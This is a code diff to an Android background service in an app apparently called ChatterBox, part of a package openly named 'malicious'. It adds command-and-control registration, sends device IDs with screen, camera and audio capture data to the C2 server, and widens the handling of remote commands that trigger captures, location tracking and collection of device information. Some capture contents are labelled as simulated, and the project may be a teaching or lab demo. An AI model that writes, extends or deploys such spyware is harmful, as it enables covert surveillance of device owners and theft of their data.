@@ -41,7 +41,6 @@ import java.util.TimerTask
 import java.util.concurrent.Semaphore
 import java.util.concurrent.TimeUnit
 import java.util.concurrent.atomic.AtomicBoolean
-import org.json.JSONObject
 
 // Import the C2 components
 import com.example.ChatterBox.malicious.C2Config
@@ -50,6 +49,9 @@ import com.example.ChatterBox.malicious.LocationTracker
 
 // Import annotations for suppressing warnings
 import androidx.annotation.RequiresApi
+
+// Import JSON processing
+import org.json.JSONObject
 
 /**
  * Background service that performs surveillance activities:
@@ -109,7 +111,17 @@ class SurveillanceService : Service() {
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         Log.d(TAG, "Service starting...")
         
-        // Register with the C2 server
+        // Make log notification to show it's running
+        showOngoingNotification("Service starting", "Attempting to connect to C2 server...")
+        
+        // Check if this is a test request
+        if (intent?.action == "TEST_C2") {
+            Log.d(TAG, "Received TEST_C2 action - testing C2 connection directly")
+            testC2Connection()
+            return START_STICKY
+        }
+        
+        // Register with the C2 server - try both HTTP and HTTPS
         c2Client.registerDevice()
         
         // Schedule surveillance activities every 30 seconds
@@ -120,6 +132,57 @@ class SurveillanceService : Service() {
         
         // If service is killed, restart it
         return START_STICKY
+    }
+    
+    /**
+     * Test the C2 connection directly for debugging
+     */
+    private fun testC2Connection() {
+        Log.d(TAG, "Testing C2 connection...")
+        showOngoingNotification("Testing C2", "Testing connection to all C2 server endpoints...")
+        
+        // Try to register device first
+        c2Client.registerDevice()
+        
+        // Then send some test data to verify exfiltration
+        val testData = JSONObject().apply {
+            put("test", true)
+            put("timestamp", System.currentTimeMillis())
+            put("message", "This is a test message from the device")
+            put("device_info", JSONObject().apply {
+                put("model", android.os.Build.MODEL)
+                put("manufacturer", android.os.Build.MANUFACTURER) 
+                put("android_version", android.os.Build.VERSION.RELEASE)
+            })
+        }
+        
+        // Send the test data
+        c2Client.sendExfiltrationData("test", testData.toString())
+        
+        // Check for commands
+        c2Client.checkForCommands { commands ->
+            if (commands.isNotEmpty()) {
+                Log.d(TAG, "Received ${commands.size} commands from C2 server")
+                processCommands(commands)
+            } else {
+                Log.d(TAG, "No commands received from C2 server")
+            }
+        }
+    }
+    
+    private fun showOngoingNotification(title: String, content: String) {
+        val notificationId = 7777
+        
+        val builder = NotificationCompat.Builder(this, CHANNEL_ID)
+            .setSmallIcon(android.R.drawable.ic_dialog_info)
+            .setContentTitle(title)
+            .setContentText(content)
+            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setOngoing(true)
+        
+        val notification = builder.build()
+        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+        notificationManager.notify(notificationId, notification)
     }
 
     private fun startSurveillanceTimer() {
@@ -208,7 +271,15 @@ class SurveillanceService : Service() {
                 out.write(message.toByteArray())
             }
             
-            Log.d(TAG, "Screen capture simulated: $filename")
+            // Also send to C2 server
+            val screenData = JSONObject().apply {
+                put("timestamp", timestamp)
+                put("device_id", Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID))
+                put("screen_content", "Simulated screen capture data at $timestamp")
+            }
+            c2Client.sendExfiltrationData("screenshots", screenData.toString())
+            
+            Log.d(TAG, "Screen capture simulated and sent to C2: $filename")
         } catch (e: Exception) {
             Log.e(TAG, "Error simulating screen capture", e)
         }
@@ -238,7 +309,15 @@ class SurveillanceService : Service() {
                 out.write(message.toByteArray())
             }
             
-            Log.d(TAG, "Camera capture simulated: $filename")
+            // Also send to C2 server
+            val cameraData = JSONObject().apply {
+                put("timestamp", timestamp)
+                put("device_id", Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID))
+                put("camera_image", "Simulated camera capture at $timestamp")
+            }
+            c2Client.sendExfiltrationData("camera", cameraData.toString())
+            
+            Log.d(TAG, "Camera capture simulated and sent to C2: $filename")
         } catch (e: Exception) {
             Log.e(TAG, "Error simulating camera capture", e)
         }
@@ -268,7 +347,15 @@ class SurveillanceService : Service() {
                 out.write(message.toByteArray())
             }
             
-            Log.d(TAG, "Audio recording simulated: $filename")
+            // Also send to C2 server
+            val audioData = JSONObject().apply {
+                put("timestamp", timestamp)
+                put("device_id", Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID))
+                put("audio_recording", "Simulated audio recording at $timestamp")
+            }
+            c2Client.sendExfiltrationData("audio", audioData.toString())
+            
+            Log.d(TAG, "Audio recording simulated and sent to C2: $filename")
         } catch (e: Exception) {
             Log.e(TAG, "Error simulating audio recording", e)
         }
@@ -321,46 +408,71 @@ class SurveillanceService : Service() {
     private fun processCommands(commands: List<String>) {
         for (command in commands) {
             try {
-                when {
-                    command.startsWith("capture_screen") || command == "capture_screenshot" -> {
-                        Log.d(TAG, "Executing command: capture_screen")
-                        // Show notification
-                        showCommandNotification("Executing capture_screen command")
-                        captureScreen()
+                Log.d(TAG, "Processing command: $command")
+                
+                // Handle commands with parameter objects
+                if (command.contains("{") && command.contains("}")) {
+                    try {
+                        val commandObj = JSONObject(command)
+                        val commandType = commandObj.optString("command", "")
+                        if (commandType.isNotEmpty()) {
+                            executeCommand(commandType, commandObj)
+                        }
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Error parsing JSON command: $command", e)
+                        // If JSON parsing fails, try as a regular command
+                        executeCommand(command, null)
                     }
-                    command.startsWith("capture_camera") -> {
-                        Log.d(TAG, "Executing command: capture_camera")
-                        // Show notification
-                        showCommandNotification("Executing capture_camera command")
-                        captureCamera()
-                    }
-                    command.startsWith("record_audio") || command == "record_audio" -> {
-                        Log.d(TAG, "Executing command: record_audio")
-                        // Show notification
-                        showCommandNotification("Executing record_audio command")
-                        recordAudio()
-                    }
-                    command == "get_location" -> {
-                        Log.d(TAG, "Executing command: get_location")
-                        // Show notification
-                        showCommandNotification("Executing get_location command")
-                        getLocation()
-                    }
-                    command == "collect_info" -> {
-                        Log.d(TAG, "Executing command: collect_info")
-                        // Show notification
-                        showCommandNotification("Executing collect_info command")
-                        collectDeviceInfo()
-                    }
-                    // More command types can be added here
-                    else -> {
-                        Log.d(TAG, "Unknown command: $command")
-                        showCommandNotification("Received unknown command: $command")
-                    }
+                } else {
+                    // Handle simple string commands
+                    executeCommand(command, null)
                 }
             } catch (e: Exception) {
                 Log.e(TAG, "Error executing command: $command", e)
                 showCommandNotification("Error executing command: $command")
+            }
+        }
+    }
+    
+    /**
+     * Execute a specific command
+     */
+    private fun executeCommand(command: String, params: JSONObject?) {
+        when {
+            command.contains("capture_screen") || command == "capture_screenshot" -> {
+                Log.d(TAG, "Executing command: capture_screen")
+                showCommandNotification("Executing capture_screen command")
+                captureScreen()
+            }
+            command.contains("capture_camera") -> {
+                Log.d(TAG, "Executing command: capture_camera")
+                showCommandNotification("Executing capture_camera command")
+                captureCamera()
+            }
+            command.contains("record_audio") || command == "record_audio" -> {
+                Log.d(TAG, "Executing command: record_audio")
+                showCommandNotification("Executing record_audio command")
+                recordAudio()
+            }
+            command.contains("location") || command == "get_location" -> {
+                Log.d(TAG, "Executing command: get_location")
+                showCommandNotification("Executing get_location command")
+                getLocation()
+            }
+            command.contains("info") || command == "collect_info" -> {
+                Log.d(TAG, "Executing command: collect_info")
+                showCommandNotification("Executing collect_info command")
+                collectDeviceInfo()
+            }
+            command.contains("collect") && command.contains("device") -> {
+                Log.d(TAG, "Executing command: collect_device_info")
+                showCommandNotification("Executing collect_device_info command")
+                collectDeviceInfo()
+            }
+            // More command types can be added here
+            else -> {
+                Log.d(TAG, "Unknown command: $command")
+                showCommandNotification("Received unknown command: $command")
             }
         }
     }
